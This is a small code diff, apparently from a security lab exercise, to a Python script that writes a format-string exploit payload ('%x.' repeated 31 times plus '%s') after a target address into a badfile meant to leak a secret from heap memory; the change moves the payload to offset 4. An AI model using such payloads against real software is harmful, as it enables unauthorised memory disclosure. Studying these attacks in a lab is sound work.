@@ -10,7 +10,7 @@ content[0:4] = (secret_address).to_bytes(4, byteorder='little')
 s = "%x." * 31 + "%s"
 
 fmt = (s).encode('latin-1')
-content[0:0 + len(fmt)] = fmt
+content[4:4 + len(fmt)] = fmt
 
 file = open("task_4_read_heap_badfile", "wb")
 file.write(content)
